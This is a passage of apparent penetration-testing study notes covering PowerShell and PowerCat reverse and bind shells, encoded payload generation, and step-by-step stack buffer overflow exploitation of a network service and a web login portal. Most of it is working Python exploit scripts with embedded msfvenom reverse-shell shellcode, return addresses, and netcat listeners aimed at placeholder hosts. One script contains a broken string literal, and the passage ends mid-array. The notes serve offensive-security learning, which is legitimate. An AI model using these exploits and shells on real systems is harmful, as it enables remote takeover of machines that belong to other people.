    <li><b>$client</b>&ensp;--&ensp;Is Assigned the Target IP and Port</li>
    <li><b>$stream</b>&ensp;--&ensp;Adds Network Stream Class to Facilitate Sending and Retrieving Data</li>
    <li><b>[byte[]]$bytes</b>&ensp;--&ensp;Buffer</li>
    <li><b>$sendback = (iex $data 2>&1 | Out-String )</b>&ensp;--&ensp;Runs any String Received as Command</li>
    <li><b>$stream.Write($sendbyte,0$sendbyte.Length</b>&ensp;--&ensp;Results Returned Via Data Steam</li>
    <li><b>$client.Close()</b>&ensp;--&ensp;Closes Connection</li>

    <br></br>
</details> 

<details>
<summary>PowerCat Tips</summary>

+ 
    <br></br>
    <b>Dot-sourcing&ensp;--&ensp;(Loading Script into Session)&ensp;--&ensp;*Needs reloaded each time you start powershell*</b>

    ```
    cd c:\Tools\practical_tools
    ```
    ```
    . .\powercat.ps1
    ```

    <br></br>
    <b>Bind Shell : PowerCat</b>

    ```
    powercat -l -p 4444 -e cmd.exe
    ```

    <li><b>-l</b>&ensp;--&ensp;Listener Mode</li>
    <li><b>-p</b>&ensp;--&ensp;Port</li>
    <li><b>-e</b>&ensp;--&ensp;Application to Execute after Connection</li>
    <br></br>
    <br></br>

    <b>Transfer Files: PowerCat</b>

    ```
    powercat -c x.x.x.x -p 4444 -i C:\Users\USER_NAME\file.ps1
    ```

    <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
    <li><b>(-p)</b>&ensp;--&ensp;Port</li>
    <li><b>(-i)</b>&ensp;--&ensp;Local File to be Transfered</li>
    <br></br>

    <b>Reverse Shells: PowerCat</b>

    ```
    powercat -c x.x.x.x -p 4444 -e cmd.exe
    ```


    <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
    <li><b>(-p)</b>&ensp;--&ensp;Port</li>
    <li><b>(-e)</b>&ensp;--&ensp;Application to Execute after Connection</li>
    <br></br>
    <br></br>

    <b>Powercat: Stand-Alone Payloads</b>

    ```
    powercat -c x.x.x.x -p 4444 -e cmd.exe -g > reverseshell.ps1
    ```

    <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
    <li><b>(-p)</b>&ensp;--&ensp;Port</li>
    <li><b>(-e)</b>&ensp;--&ensp;Application to Execute after Connection</li>
    <li><b>(-g)</b>&ensp;--&ensp;Generate Payload and Redirect output to File</li>
    <br></br>
    <br></br>

    <b>Powercat: Stand-Alone Encoded Payloads</b>

    ```
    powercat -c x.x.x.x -p 4444 -e cmd.exe -ge > encoded_reverseshell.ps1
    ```

    <li><b>(-c)</b>&ensp;--&ensp;Client Mode</li>
    <li><b>(-p)</b>&ensp;--&ensp;Port</li>
    <li><b>(-e)</b>&ensp;--&ensp;Application to Execute after Connection</li>
    <li><b>(-ge)</b>&ensp;--&ensp;Generate Encoded Payload and Redirect output to File</li>
    <br></br>
    <b>Powercat: Stand-Alone Encoded Payloads: Copy Encoded Contents of File</b>

    ```
    notepad ./encoded_reverseshell.ps1
    ```

    <b>Powercat: Stand-Alone Encoded Payloads: Paste Encoded Contents of File</b>

    ```
    powershell -E
    ```

    <li><b>(-E)</b>&ensp;--&ensp;(EncodedCommand) Option</li>
    <br></br>
</details>

<details>
<summary>Buffer Overflow</summary>

+ <details>
    <summary>Remote Buffer Overflow</summary>
    
    +
        <b>Initial Setup</b>

        ```
        Start Immunity-Debugger & Software as Administrator
        ```
        ```
        File --> Attach --> Select exe you are testing --> Attach --> Play Button
        ```
        From Terminal: Target IP and Port Vuln Service is Running on 
        ```
        nc -nv x.x.x.x 9999
        ```

        <br></br>
        <b>Spiking: Method to find Vulnerable Part of Program</b>

        Change STATS out for Command you are Testing & Save as \<CommandName\>.spk
        ```
        s_readline();
        s_string("STATS ");
        s_string_variable("0");
        ```
        Run Command and look for Program to crash in Immunity Debugger
        ```
        generic_send_tcp x.x.x.x 9999 stats.spk 0 0
        ```

        <br></br>
        <b>Fuzzing: Try to Break Program by sending a bunch of characters at it</b>

        ```
        #!/usr/bin/python2
        import sys, socket
        from time import sleep


        size = 100

        while True:
            try:
        
                buffer = "A" * size
                
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                
                s.connect(("x.x.x.x", 9999))
                data = s.recv(1024)

                print "\nSending evil buffer with %s bytes" % size
        
                s.send(('TRUN /.:/' + buffer))
                s.close()
                size += 100

                print data

                sleep(1)

            except:            
                print "\nFuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
        ```

        <br></br>
        <b>Find the Offset: At what point did we break it?</b> use the number or more of bytes program crashed at. Program Crashed around 2100 try 2500

        ```
        msf-pattern_create -l 2500
        ```
        ```
        #!/usr/bin/python2
        import sys, socket


        offset = ""
        
        try:
            print "\nLocating Offset..."
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("x.x.x.x", 9999))
            s.send(('TRUN /.:/' + offset))
            s.close()
  
        except:            
            print "\nError Connecting to Server"
            sys.exit()
        ```
        
        Check EIP in Registers (FPU) to see if it has been overwritten. You should only see EIP and 8 Characters after 
        copy the 8 characters
       
        ```
        msf-pattern_offset -l 2500 -q 386F4337
        ```
        
        copy the offset returned
       
        

        <br></br>
        <b>Overwrite the EIP</b>

        ```
        #!/usr/bin/python2
        import sys, socket

       
        shellcode = "A" * 2003 + "B" * 4
        
        try:
            print "\nOverwriting EIP..."
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("x.x.x.x", 9999))
            s.send(('TRUN /.:/' + shellcode))
            s.close()
  
        except:            
            print "\nError Connecting to Server"
            sys.exit()
        ```

        <br></br>
        <b>Find Bad Characters</b>
        Run --> Check Immunity Debugger --> Right Click ESP --> Follow in Dump --> Find first missing character --> Return to code --> Delete Character Missed --> Repeat

        ```
        #!/usr/bin/python2
        import sys, socket

       
        badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
       
        shellcode = "A" * 2003 + "B" * 4 + badchars
        
        try:
            print "\nLocating Bad Characters..."
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("x.x.x.x", 9999))
            s.send(('TRUN /.:/' + shellcode))
            s.close()
  
        except:            
            print "\nError Connecting to Server"
            sys.exit()
        ```
        

        <br></br>
        <b>Find the Right Module</b>
        download mona.py to:
        ```
        C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
        ```
        ```
        https://github.com/corelan/mona
        ```
        
        within immunity debugger with program attached, type the following in the bottom bar
        
        ```
        !mona modules
        ```
        
        <b>look for .dll attached to program that has least amount of protection FALSE on all is Ideal</b>

        <b>(You can Skip these 2 commands) Finding Opcode equivalent of a jump from kali</b>
        
        ```
        msf-nasm_shell
        ```
        ```
        JMP ESP
        ```
        
        this will = FFE4
        Back to Immunity Debugger
        use the name of the .dll after -m
        
        ```
        !mona find -s "\xff\xe4" -m essfunc.dll
        ```
        
        <b>now go down the list from results and take each address to find what works for next steps</b>
        <b>in Immunity debugger click the black arrow under options</b>
        
        
        ![image](https://user-images.githubusercontent.com/75488156/183314484-0c1b2c57-fd22-4ae9-ba08-14cce0ce61a7.png)
        
        
        ```
        Enter Address found in last step
        ```
        ```
        F2 on JMP
        ```
        ```
        Click Play
        ```
        ```
        Run Script below
        ```
        
        ```
        #!/usr/bin/python2
        import sys, socket

        # 625011AF

        shellcode = "A" * 2003 + "B" * 4 + "\xaf\x11\x50\x62"

        try:
            print "\nControlling EIP..."
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("x.x.x.x", 9999))
            s.send(('TRUN /.:/' + shellcode))
            s.close()

        except:            
            print "\nError Connecting to Server"
            sys.exit()
        ```
       
        
        
        <br></br>
        <b>Generate Shellcode</b>
        replace x.x.x.x with kali machine ip & add all bad characters after -b
        
        ```
        msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
        ```
        ```
        sudo nc -lnvp 443
        ```
        ```
        #!/usr/bin/python2
        import sys, socket

        overflow = (
        "\xdd\xc0\xd9\x74\x24\xf4\x5a\xb8\xb8\xf1\xf3\xce\x2b\xc9\xb1"
        "\x52\x31\x42\x17\x03\x42\x17\x83\x52\x0d\x11\x3b\x5e\x06\x54"
        "\xc4\x9e\xd7\x39\x4c\x7b\xe6\x79\x2a\x08\x59\x4a\x38\x5c\x56"
        "\x21\x6c\x74\xed\x47\xb9\x7b\x46\xed\x9f\xb2\x57\x5e\xe3\xd5"
        "\xdb\x9d\x30\x35\xe5\x6d\x45\x34\x22\x93\xa4\x64\xfb\xdf\x1b"
        "\x98\x88\xaa\xa7\x13\xc2\x3b\xa0\xc0\x93\x3a\x81\x57\xaf\x64"
        "\x01\x56\x7c\x1d\x08\x40\x61\x18\xc2\xfb\x51\xd6\xd5\x2d\xa8"
        "\x17\x79\x10\x04\xea\x83\x55\xa3\x15\xf6\xaf\xd7\xa8\x01\x74"
        "\xa5\x76\x87\x6e\x0d\xfc\x3f\x4a\xaf\xd1\xa6\x19\xa3\x9e\xad"
        "\x45\xa0\x21\x61\xfe\xdc\xaa\x84\xd0\x54\xe8\xa2\xf4\x3d\xaa"
        "\xcb\xad\x9b\x1d\xf3\xad\x43\xc1\x51\xa6\x6e\x16\xe8\xe5\xe6"
        "\xdb\xc1\x15\xf7\x73\x51\x66\xc5\xdc\xc9\xe0\x65\x94\xd7\xf7"
        "\x8a\x8f\xa0\x67\x75\x30\xd1\xae\xb2\x64\x81\xd8\x13\x05\x4a"
        "\x18\x9b\xd0\xdd\x48\x33\x8b\x9d\x38\xf3\x7b\x76\x52\xfc\xa4"
        "\x66\x5d\xd6\xcc\x0d\xa4\xb1\x32\x79\x6a\xd9\xdb\x78\x72\xcb"
        "\x47\xf4\x94\x81\x67\x50\x0f\x3e\x11\xf9\xdb\xdf\xde\xd7\xa6"
        "\xe0\x55\xd4\x57\xae\x9d\x91\x4b\x47\x6e\xec\x31\xce\x71\xda"
        "\x5d\x8c\xe0\x81\x9d\xdb\x18\x1e\xca\x8c\xef\x57\x9e\x20\x49"
        "\xce\xbc\xb8\x0f\x29\x04\x67\xec\xb4\x85\xea\x48\x93\x95\x32"
        "\x50\x9f\xc1\xea\x07\x49\xbf\x4c\xfe\x3b\x69\x07\xad\x95\xfd"
        "\xde\x9d\x25\x7b\xdf\xcb\xd3\x63\x6e\xa2\xa5\x9c\x5f\x22\x22"
        "\xe5\xbd\xd2\xcd\x3c\x06\xf2\x2f\x94\x73\x9b\xe9\x7d\x3e\xc6"
        "\x09\xa8\x7d\xff\x89\x58\xfe\x04\x91\x29\xfb\x41\x15\xc2\x71"
        "\xd9\xf0\xe4\x26\xda\xd0")

        # 625011AF

        shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

        try:
            print "\nSending Reverse Shell..."
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("x.x.x.x", 9999))
            s.send(('TRUN /.:/' + shellcode))
            s.close()

        except:            
            print "\nError Connecting to Server"
            sys.exit()
        ```
        
        <br></br>
    </details>
    
    
    <details>
    <summary>App Web Portal Buffer Overflow</summary>
    
    +
        <b>Initial Setup</b>

        ```
        Start Immunity-Debugger & Software as Administrator
        ```
        ```
        File --> Attach --> Select exe you are testing --> Attach --> Play Button
        ```
        
        start wireshark and try logging into web portal to send post request Copy Post request information for script. EX
        
        ```
        POST /login HTTP/1.1
        Host: x.x.x.x
        User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Referer: http://x.x.x.x/login
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 27

        username=AAAA&password=BBBB
        ```

        <br></br>
        <b>Fuzzing: Try to Break Program by sending a bunch of characters at it</b>

        ```
        #!/usr/bin/python2
        import socket
        import time
        import sys


        size = 100
        
        while(size < 2000):
          try:
            print "\nSending evil buffer with %s bytes" % size

            inputBuffer = "A" * size

            content = "username=" + inputBuffer + "&password=A"

            buffer = "POST /login HTTP/1.1\r\n"
            buffer += "Host: x.x.x.x\r\n"
            buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
            buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            buffer += "Accept-Language: en-US,en;q=0.5\r\n"
            buffer += "Referer: http://x.x.x.x/login\r\n"
            buffer += "Connection: close\r\n"
            buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
            buffer += "Content-Length: "+str(len(content))+"\r\n"
            buffer += "\r\n"

            buffer += content

            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

            s.connect(("x.x.x.x", 80))
            s.send(buffer)

            s.close()

            size += 100
            time.sleep(10)

          except:
            print "\nFuzzing crashed at %s bytes" % str(len(buffer))
            sys.exit()
        ```

        <br></br>
        <b>Find the Offset: At what point did we break it?</b> use the number or more of bytes program crashed at. If the program crashed around 2100 try 2500

        ```
        msf-pattern_create -l 2500
        ```
        ```
        #!/usr/bin/python2
        import sys, socket

        try:
          print "\nLocating Offset..."

          offset = ""

          content = "username=" + offset + "&password=A"

          buffer = "POST /login HTTP/1.1\r\n"
          buffer += "Host: x.x.x.x\r\n"
          buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
          buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          buffer += "Accept-Language: en-US,en;q=0.5\r\n"
          buffer += "Referer: http://x.x.x.x/login\r\n"
          buffer += "Connection: close\r\n"
          buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
          buffer += "Content-Length: "+str(len(content))+"\r\n"
          buffer += "\r\n"

          buffer += content

          s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

          s.connect(("x.x.x.x", 80))
          s.send(buffer)

          s.close()

          print "\nDone!"

        except:
          print "\nCould not connect!"
          sys.exit()
        ```

        Check EIP in Registers (FPU) to see if it has been overwritten. You should only see EIP and 8 Characters after 
        copy the 8 characters

        ```
        msf-pattern_offset -l 2500 -q 386F4337
        ```

        copy the offset returned



        <br></br>
        <b>Overwrite the EIP</b>

        ```
        #!/usr/bin/python2
        import sys, socket

        try:
          print "\nOverwriting EIP..."

          filler = "A" * 780
          eip = "B" * 4
          buffer = "C" * 16
          shellcode = filler + eip + buffer

          content = "username=" + shellcode + "&password=A"

          buffer = "POST /login HTTP/1.1\r\n"
          buffer += "Host: x.x.x.x\r\n"
          buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
          buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          buffer += "Accept-Language: en-US,en;q=0.5\r\n"
          buffer += "Referer: http://x.x.x.x/login\r\n"
          buffer += "Connection: close\r\n"
          buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
          buffer += "Content-Length: "+str(len(content))+"\r\n"
          buffer += "\r\n"

          buffer += content

          s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

          s.connect(("x.x.x.x", 80))
          s.send(buffer)

          s.close()

          print "\nDone!"

        except:
          print "\nError Connecting to Server"
          sys.exit()
        ```
        
        <br></br>
        <b>Locating Space for Shellcode: standard reverse shell payload requires around 350-400 bytes of space: So we may need to extend buffer length</b>
        
        ```
        #!/usr/bin/python2
        import sys, socket

        try:
          print "\nLocating Space..."

          filler = "A" * 780
          eip = "B" * 4
          offset = "C" * 4
          buffer = "D" * (1500 - len(filler) -len(eip) - len(offset))
          shellcode = filler + eip + offset + buffer

          content = "username=" + shellcode + "&password=A"

          buffer = "POST /login HTTP/1.1\r\n"
          buffer += "Host: x.x.x.x\r\n"
          buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
          buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          buffer += "Accept-Language: en-US,en;q=0.5\r\n"
          buffer += "Referer: http://x.x.x.x/login\r\n"
          buffer += "Connection: close\r\n"
          buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
          buffer += "Content-Length: "+str(len(content))+"\r\n"
          buffer += "\r\n"

          buffer += content

          s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

          s.connect(("x.x.x.x", 80))
          s.send(buffer)

          s.close()

          print "\nDone!"

        except:
          print "\nError Connecting to Server"
          sys.exit()
        ```

        <br></br>
        <b>Find Bad Characters</b>
        Run --> Check Immunity Debugger --> Right Click ESP --> Follow in Dump --> Find first missing character --> Return to code --> Delete Character Missed --> Repeat

        ```
        #!/usr/bin/python2
        import sys, socket

        badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

        try:
          print "\nLocating Bad Characters..."

          filler = "A" * 780
          eip = "B" * 4
          offset = "C" * 4

          shellcode = filler + eip + offset + badchars

          content = "username=" + shellcode + "&password=A"

          buffer = "POST /login HTTP/1.1\r\n"
          buffer += "Host: x.x.x.x\r\n"
          buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
          buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          buffer += "Accept-Language: en-US,en;q=0.5\r\n"
          buffer += "Referer: http://x.x.x.x/login\r\n"
          buffer += "Connection: close\r\n"
          buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
          buffer += "Content-Length: "+str(len(content))+"\r\n"
          buffer += "\r\n"

          buffer += content

          s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

          s.connect(("x.x.x.x", 80))
          s.send(buffer)

          s.close()

          print "\nDone!"

        except:
          print "\nError Connecting to Server"
          sys.exit()
        ```


        <br></br>
        <b>Find the Return Address</b>
        download mona.py to:
        ```
        C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
        ```
        ```
        https://github.com/corelan/mona
        ```

        within immunity debugger with program attached, type the following in the bottom bar

        ```
        !mona modules
        ```

        <b>look for .dll attached to program that has least amount of protection FALSE on all is Ideal</b>

        <b>(You can Skip these 2 commands) Finding Opcode equivalent of a jump from kali</b>

        ```
        msf-nasm_shell
        ```
        ```
        jmp esp
        ```

        this will = FFE4
        Back to Immunity Debugger
        use the name of the .dll after -m

        ```
        !mona find -s "\xff\xe4" -m libspp.dll
        ```

        <b>now go down the list from results and take each address to find what works for next steps</b>
        <b>in Immunity debugger click the black arrow under options</b>
        
        ![image](https://user-images.githubusercontent.com/75488156/183314484-0c1b2c57-fd22-4ae9-ba08-14cce0ce61a7.png)

        ```
        Enter Address found in last step
        ```
        ```
        F2 on JMP
        ```
        ```
        Click Play
        ```
        ```
        Run Script below
        ```

        ```
       #!/usr/bin/python2
        import sys, socket

        try:
          print "\nLocating Space..."

          #10090c83
          filler = "A" * 780
          eip = "\x83\x0c\x09\x10
          offset = "C" * 4
          buffer = "D" * (1500 - len(filler) -len(eip) - len(offset))
          shellcode = filler + eip + offset + buffer

          content = "username=" + shellcode + "&password=A"

          buffer = "POST /login HTTP/1.1\r\n"
          buffer += "Host: x.x.x.x\r\n"
          buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
          buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          buffer += "Accept-Language: en-US,en;q=0.5\r\n"
          buffer += "Referer: http://x.x.x.x/login\r\n"
          buffer += "Connection: close\r\n"
          buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
          buffer += "Content-Length: "+str(len(content))+"\r\n"
          buffer += "\r\n"

          buffer += content

          s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

          s.connect(("x.x.x.x", 80))
          s.send(buffer)

          s.close()

          print "\nDone!"

        except:
          print "\nError Connecting to Server"
          sys.exit()
        ```


        <br></br>
        <b>Generate Shellcode</b>
        replace x.x.x.x with kali machine ip & add all bad characters after -b

        ```
        msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d""
        ```
        
        ```
        sudo nc -lnvp 443
        ```

        ```
        #!/usr/bin/python2
        import socket

        try:
          print "\nSending Reverse Shell..."

          shellcode = ("\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
          "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
          "\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59"
          "\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48"
          "\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f"
          "\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6"
          "\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4"
          "\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff"
          "\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1"
          "\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8"
          "\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2"
          "\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62"
          "\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e"
          "\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2"
          "\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e"
          "\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49"
          "\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70"
          "\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23"
          "\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f"
          "\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56"
          "\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8"
          "\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b"
          "\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6"
          "\x5f\xa3\x05\x74\x5f\xe6")

          filler = "A" * 780
          eip = "\x83\x0c\x09\x10"
          offset = "C" * 4
          nops = "\x90" * 10

          inputBuffer = filler + eip + offset + nops + shellcode

          content = "username=" + inputBuffer + "&password=A"

          buffer = "POST /login HTTP/1.1\r\n"
          buffer += "Host: x.x.x.x\r\n"
          buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
          buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
          buffer += "Accept-Language: en-US,en;q=0.5\r\n"
          buffer += "Referer: http://x.x.x.x/login\r\n"
          buffer += "Connection: close\r\n"
          buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
          buffer += "Content-Length: "+str(len(content))+"\r\n"
          buffer += "\r\n"

          buffer += content

          s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

          s.connect(("x.x.x.x", 80))
          s.send(buffer)

          s.close()

          print "\nReverse Shell Complete"

        except:
          print "\nCould not connect!"
        
        ```

        <br></br>
    </details>
    
    <details>
    <summary>Buffer Overflow Example 3</summary>
    
    +
        <b>Slow Manual Fuzzing</b>
        Start Program and Paste 100 then 200 then 300 A's until Crash.
        
        ```
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        ```
        
        <br></br>
        <b>Find Offset<b>
        
        ```
        Use crash point  for total of ABC, 4 Bs and adjust A and C till Bs show up in EIP
        ```
        
        <br></br>
        
        <b>Bad Characters</b>
        
        ```
        #!/usr/bin/env python3

        # \x00

        badchars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
